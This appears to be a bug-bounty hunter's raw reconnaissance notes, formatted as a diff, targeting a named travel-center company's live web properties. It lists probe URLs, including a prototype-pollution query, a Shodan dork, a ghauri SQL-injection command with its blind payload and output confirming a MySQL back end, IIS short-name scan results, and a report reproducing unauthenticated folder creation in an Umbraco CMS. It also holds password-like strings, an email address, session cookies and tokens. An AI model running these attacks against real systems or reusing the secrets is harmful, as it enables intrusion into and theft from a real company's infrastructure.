+https://jobs.pilotflyingj.com/?utm_source=pilot&utm_medium=YextLocationsBlock&utm_campaign=recruitment
+
+https://locations.pilotflyingj.com/us/oh/toledo/5820-hagman-road?utm_source=Pilot&utm_medium=YextAlertBanner&utm_campaign=LaneClosures
+https://loyaltyportal.pilotflyingj.com/myrewards/confirmation?token=1V_tJgGvHMjbhDdZJZ2i0AFywOzVgo5RvJRxwNHxSnmB&_branch_match_id=1306343452090145625&utm_medium=marketing&_branch_referrer=H4sIAAAAAAAAA8soKSkottLXL8jMyS9Jy6nMzEvP0kssKNDLyczL1g8N8cs2DM8MDA61L8nPTs2zNQyLL%2FFKdy%2Fz8M1KynBJifKKMso0cHSrLPevCkvPNw0q8wqqKPfzqAjOy3UCAKppM4FbAAAA
+
+
+
+https://www.pilotflyingj.com/fleet/?gclid=CjwKCAjw27jnBRBuEiwAdjQXDKa88lGoLX9TsMN-1hFXB4HIlIdYONa_sd8uRLLXfZY3MCpW2Dns0xoCqIwQAvD_BwE
+
+
+https://videorequests.pilotflyingj.com/servlet/servlet.ImageServer?id=0153c000004TP9N&oid=00D80000000bzL1&lastMod=1602444230000
+
+https://videorequests.pilotflyingj.com/s/sfsites/l/%7B%22mode%22%3A%22PROD%22%2C%22cac%22%3A0%2C%22app%22%3A%22siteforce%3AloginApp2%22%2C%22fwuid%22%3A%22ZDROWDdLOGtXcTZqSWZiU19ZaDJFdzk4bkk0bVJhZGJCWE9mUC1IZXZRbmcyNDguMTAuNS01LjAuMTA%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AloginApp2%22%3A%22CMiYVlPW6pOgNvM9UnJGCw%22%7D%2C%22apce%22%3A1%2C%22apck%22%3A%22JHt0aW1lc3RhbXB9MDAwMDAwMDAwMDBlbl9VUw%22%2C%22mlr%22%3A1%2C%22pathPrefix%22%3A%22%22%2C%22dns%22%3A%22c%22%2C%22ls%22%3A1%2C%22lrmc%22%3A%22-386269907%22%7D/bootstrap.js?aura.attributes=%7B%22ac%22%3A%22%22%2C%22authenticated%22%3A%22false%22%2C%22brandingSetId%22%3A%2293b8bb8e-a48f-4ca0-b591-b37ee1e27633%22%2C%22formFactor%22%3A%22LARGE%22%2C%22isHybrid%22%3A%22false%22%2C%22language%22%3A%22en_US%22%2C%22pageId%22%3A%220f5f1962-5c39-4a48-b964-2edf8b3068f3%22%2C%22publishedChangelistNum%22%3A%2231%22%2C%22schema%22%3A%22Published%22%2C%22themeLayoutType%22%3A%22Login%22%2C%22uds%22%3A%22false%22%2C%22viewType%22%3A%22Published%22%7D
+
+https://videorequests.pilotflyingj.com/s/sfsites/l/%7B%22mode%22%3A%22PROD%22%2C%22cac%22%3A0%2C%22app%22%3A%22siteforce%3AloginApp2%22%2C%22fwuid%22%3A%22ZDROWDdLOGtXcTZqSWZiU19ZaDJFdzk4bkk0bVJhZGJCWE9mUC1IZXZRbmcyNDguMTAuNS01LjAuMTA%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AloginApp2%22%3A%22CMiYVlPW6pOgNvM9UnJGCw%22%7D%2C%22apce%22%3A1%2C%22apck%22%3A%22JHt0aW1lc3RhbXB9MDAwMDAwMDAwMDBlbl9VUw%22%2C%22mlr%22%3A1%2C%22pathPrefix%22%3A%22%22%2C%22dns%22%3A%22c%22%2C%22ls%22%3A1%2C%22lrmc%22%3A%22-386269907%22%7D/resources.js?pv=1716476882000107833704&rv=1716613992000
+
+https://videorequests.pilotflyingj.com/s/login?ec=302&inst=8a&startURL=%2Fcontenthub%2F
+https://recover.pilotflyingj.com/showLogin.cc?constructor%5Bprototype%5D%5Ba42e5579%5D=yf2xy3x9&constructor.prototype.b1a3fd5b=yf2xy3x9&__proto__.ccd80966=yf2xy3x9&__proto__%5Bdcb52823%5D=yf2xy3x9
+
+
+
+
+https://privacy.pilotflyingj.com/s/sfsites/aura?r=2&aura.Component.getComponent=1&ui-communities-components-aura-components-forceCommunity-navigationMenu.NavigationMenuDataProvider.getNavigationMenu=1&ui-communities-components-aura-components-forceCommunity-richText.RichText.getParsedRichTextValue=2&ui-force-components-controllers-hostConfig.HostConfig.getConfigData=1&ui-self-service-components-profileMenu.ProfileMenu.getProfileMenuResponse=1
+
+
+https://jobs.pilotflyingj.com/travel-center-jobs?custom_categories=Travel+Center+Jobs&location_city=Rawlins&location_state=Wyoming&page_number=1&page_size=50&sort_by=headline&sort_order=ASC
+http://blog.pilotflyingj.com/wp-json/swp_api/search?s=
+http://hubspot.pilotflyingj.com/travel-guide?portalId=339778&hsFormKey=12fdc54461cbe7a499d4479c41df20c3
+http://jobs.pilotflyingj.com/?debug=3e4edc5e4ade7278ed750502bde7eb65c16e037d
+http://jobs.pilotflyingj.com/ajax/click/track/insert/?FK1=5394107&EventID=9&EventData=&JobSource=
+
+
+
+
+https://loyaltyportal.pilotflyingj.com/myrewards/registration
+
+For this vulnerability, just type shodan title:"Check Point" ssl:"target"
+
+
+elati
+handru
+
+#5g/GGgd0xx
+
+samindunm
+
+
+#FU57/EVGss
+
+#FU57/EVGss
+
+
+
+TO_DO
+
+manual test main app
+
+with main app coockis try to acsees some 403 domains
+
+
+
+
+GET /pfj-loyaltymkt-one9-website-e*/ HTTP/1.1
+Host: api.cp.pilotflyingj.com
+Accept-Encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="114", "Chromium";v="114"
+Sec-CH-UA-Platform: Windows
+Sec-CH-UA-Mobile: ?0
+
+
+
+python3.9 -m venv env
+elit7b@7b:~$ source env/bin/activate
+
+
+ghauri -u https://roadtrips.pilotflyingj.com/RECRUITMENT/JOB_POSTINGS/MANAGEMENT.ASPX?PostingSetupID=* 
+
+
+[13:16:18] [INFO] testing connection to the target URL
+Ghauri resumed the following injection point(s) from stored session:
+---
+Parameter: PostingSetupID (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: PostingSetupID=" OR NOT 04589=4589
+---
+[13:16:19] [INFO] testing MySQL
+got a 302 redirect to 'https://roadtrips.pilotflyingj.com/RECRUITMENT/JOB_POSTINGS/Error.aspx?ErrorID=95c6d439-d7f6-40e5-a129-13c17dedef2c&TryAgainURL=https%3a%2f%2froadtrips.pilotflyingj.com%2fRECRUITMENT%2fJOB_POSTINGS%2fMANAGEMENT.ASPX%3fPostingSetupID%3d%22+OR+NOT+(SELECT+QUARTER(NULL))+IS+NULL%2523'. Do you want to follow? [Y/n] 
+
+[13:16:23] [INFO] confirming MySQL
+[13:16:26] [INFO] the back-end DBMS is MySQL
+[13:16:26] [INFO] fetching current database
+[13:16:33] [INFO] retrieving the length of query output
+[13:16:46] [INFO] retrieved: : 
+[13:16:46] [WARNING] it was not possible to extract query output length for the SQL query provided.
+
+
+ghauri -u https://roadtrips.pilotflyingj.com/RECRUITMENT/JOB_POSTINGS/MANAGEMENT.ASPX?PostingSetupID=*
+
+
+
+
+
+
+
+
+
+Error
+
+We had a problem authorizing the credit card. Please contact Cloud Trust Enablement at verify@us.ibm.com from the registered email address.
+Code: 0750d832-e406-43e1-8e75-7d73b1fbd24f
+
+
+
+
+
+
+
+
+
+pilotflyingj.com
+
+
+#BYGn4526hs
+samidunimsara.cloud@gmail.com
+
+
+
+URL: https://applicantassessment.pilotflyingj.com/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+MYPROJ~1             MYPROJ?             MY%20PROJECT
+WEB~1.CON            WEB.CON?   
+ASSESS~1.JS          ASSESS?.JS   assessment.JS
+ASSESS~1.VB          ASSESS?.VB 
+ASSESS~2.VB          ASSESS?.VB 
+APPLIC~1.USE         APPLIC?.USE? 
+ASSESS~1.XSL         ASSESS?.XSL?  assessment.XSLT
+ASSESS~1.ASP         ASSESS?.ASP?  assessment.aspx
+WEBDEB~1.CON         WEBDEB?.CON? 
+WEBREL~1.CON         WEBREL?.CON? 
+STYLES~1.CSS         STYLES?.CSS?        STYLESHEET1.CSS
+APPLIC~1.VBP         APPLIC?.VBP? 
+PACKAG~1.CON         PACKAG?.CON? 
+════════════════════════════════════════════════════════════════════════════════
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://applicantassessment.pilotflyingj.com/MY%20PROJECT/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+MYEXTE~1             MYEXTE?             MYEXTENSIONS
+RESOUR~1.VB          RESOUR?.VB 
+APPLIC~1.MYA         APPLIC?.MYA? 
+SETTIN~1.SET         SETTIN?.SET? 
+SETTIN~1.VB          SETTIN?.VB 
+APPLIC~1.VB          APPLIC?.VB 
+ASSEMB~1.VB          ASSEMB?.VB 
+RESOUR~1.RES         RESOUR?.RES? 
+════════════════════════════════════════════════════════════════════════════════
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://applicantassessment.pilotflyingj.com/MY%20PROJECT/MYEXTENSIONS/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+MYWEBE~1.VB          MYWEBE?.VB 
+════════════════════════════════════════════════════════════════════
+
+
+
+
+
+
+
+https://applicantassessment.pilotflyingj.com/assessment.aspx?applicantId=zwrtxqvaiiizhsc0so&rp5o4sdr7l1&applicantType=zwrtxqvaiiizhsc0so&assessmentType=zwrtxqvaiiizhsc0so&completedAssessmentCallbackUrl=zwrtxqvaiiizhsc0so&assessmentResultUrl=zwrtxqvaiiizhsc0so
+
+https://saml.pilotflyingj.com/adfs/ls/IdpInitiatedSignOn.aspx
+
+
+https://pilotflyingj.com/umbraco/umbraco/backoffice/UmbracoApi/CurrentUser/
+https://pilotflyingj.com/umbraco/surface/socialmedia/instagramposts
+https://pilotflyingj.com/umbraco#/login/false?returnPath=%252Fcontent%253FreturnPath%253D%2525252Fcontent
+
+
+
+
+https://pilotflyingj.com/umbraco/developer/Packages/proxy.htm
+umbraco/channels/rsd.aspx
+https://pilotflyingj.com/umbraco/Views/users/views/users/users.html
+https://pilotflyingj.com/umbraco/Views/users/views/user/details.html
+
+
+https://pilotflyingj.com/umbraco/Views/templates/delete.html
+
+https://pilotflyingj.com/umbraco/Views/propertyeditors/validationtest/validationtest.html
+
+
+https://pilotflyingj.com/umbraco/Views/propertyeditors/test/test.html
+
+
+https://pilotflyingj.com/umbraco/Views/propertyeditors/urllist/urllist.html
+
+
+
+https://pilotflyingj.com/umbraco/Views/scripts/create.html
+https://pilotflyingj.com/Umbraco/Views/stylesheets/create.html?
+
+
+``
+
+
+Misconfigured Umbraco Allows Unauthorized Attacker to Create Folders
+
+
+A misconfiguration in the Umbraco CMS on https://pilotflyingj.com/umbraco/ allows unauthorized attackers to create folders via an unprotected endpoint. This could potentially lead to unauthorized access to sensitive files and further exploitation of the server.
+
+
+Steps to Reproduce:
+
+Access the Vulnerable Endpoint:
+
+Navigate to https://pilotflyingj.com/umbraco/Views/scripts/create.html. This endpoint is accessible without authentication
+
+
+Create a Folder:
+
+Enter any folder name in the input field and click the "Create" button.
+
+
+
+After clicking the "Create" button, a request is made to the server:
+
+GET /umbraco/Views/scripts/create.html?folderName=samidunimsara%40wearehackerone.com&as_sfid=AAAAAAUBV_bRTKcz2X-KGV61RqE-TxHoHy-aql7E3n3DVrKIndlvv8GKgLZOvJAMjqDTFrFAWNUi9gvj9k7-gCJzWVUlNsQNfA2l0w3E0xLhTlosF188U74SlF2Yeo80D-0wZBFs4vcLxCLmXV7Lf2gCSlGO-WiwUcq2mWTpNkukf68CHQ%3D%3D&as_fid=d18b166df6d8109120a83202bfb2b97d7371c1fd HTTP/1.1
+Host: pilotflyingj.com
+Cookie: _fbp=fb.1.1716215089000.1571079305; cimcid=320523e8-c974-40c5-8ad0-0007ddbbe86c; OptanonAlertBoxClosed=2024-06-03T06:36:06.093Z; s_fid=675F14E096D53267-35BE48E8B2F0DEF4; __ric=16226%3AThu%20Jun%2020%202024%2010%3A58%3A11%20GMT+0530%20%28India%20Standard%20Time%29%7C; _ga_X8386CWYT4=GS1.2.1718879902.3.0.1718879902.60.0.0; _ga_K9M9ZLHYDN=GS1.1.1718879900.4.1.1718879995.0.0.0; _ga_7YM7H4ZH8N=GS1.1.1718879135.2.1.1718880680.0.0.0; _ga_N0R9DWTQYC=GS1.1.1718880705.1.1.1718881270.0.0.0; _pxvid=72a715fa-348a-11ef-8f29-191eed497a81; _gcl_aw=GCL.1721319681.CjwKCAjw27jnBRBuEiwAdjQXDKa88lGoLX9TsMN-1hFXB4HIlIdYONa_sd8uRLLXfZY3MCpW2Dns0xoCqIwQAvD_BwE; _gac_UA-13223771-11=1.1721319682.CjwKCAjw27jnBRBuEiwAdjQXDKa88lGoLX9TsMN-1hFXB4HIlIdYONa_sd8uRLLXfZY3MCpW2Dns0xoCqIwQAvD_BwE; _ga=GA1.1.1443064497.1716215084; _gcl_au=1.1.1931168137.1725032076; OptanonConsent=isGpcEnabled=0&datestamp=Fri+Aug+30+2024+21%3A08%3A22+GMT%2B0530+(India+Standard+Time)&version=202306.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&landingPath=NotLandingPage&groups=C0003%3A1%2CC0001%3A1%2CC0004%3A1%2CC0002%3A1%2CSPDTA_BG%3A1&AwaitingReconsent=false&geolocation=US%3BVA; _ga_JQ5RPHB2EE=GS1.1.1725032093.11.1.1725032438.60.0.0; citrix_ns_id=AAE75cDSZjuwF3EAAAAAADuCnoNXN-vDtwXKO-ULVuOl-26BUN2jWiQNVLiG4RzVOw==2cTSZg==q-py7cBdAYiXr9ZKGW_fuOr1a7k=
+Sec-Ch-Ua: 
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: ""
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest:
+
+
+Check the file system or the application backend to confirm that the folder with the name samidunimsara@wearehackerone.com was created successfully
+
+Proof of Concept: 
+
+
+
+
+
+
+
+
+One9 Fuel Network
+
+https://one9fuelnetwork.com/
+
+© 2024 Pilot Travel Centers LLC. All rights reserved.
+
+
+The company operates truck stops under the,
+
+Pilot Travel Centers,
+Flying J Travel Plaza,
+ONE9 Fuel Network,
+Mr. Fuel brands
+
+
+Pilot Flying J also is known as the largest Travel Center chain in the country with over 750 locations under the Pilot, Flying J, & Mr. Fuel brands
+
+pilot energy
+
+https://pilotflyingj.com/press-release/30532#:~:text=About%20Pilot&text=Founded%20in%201958%20and%20headquartered,employs%20approximately%2030%2C000%20team%20members.
+
+
+Pilot Water Solutions
+
+
+https://www.knoxnews.com/story/money/business/2020/01/23/pilot-flying-j-new-name-pilot-company-truck-stop/4464441002/
+
+
+
+https://pilotco.pilotcompany.com/s/
+https://pilotco.pilotcompany.com/s/topic/0TO3c000000MreUGAS/human-resources
+
+https://login-ed.com/pilot-travel-center-employee
+
+https://gcb.today/en-US/us/gift-card-balance/pilot-flying-j
+
+
+https://tartanoil.com/privacy-policy
+
+
+
+
+
+https://spamdigest.pilottravelcenters.com:10000/admin
+
+https://refined.saratogarack.com/ java
+
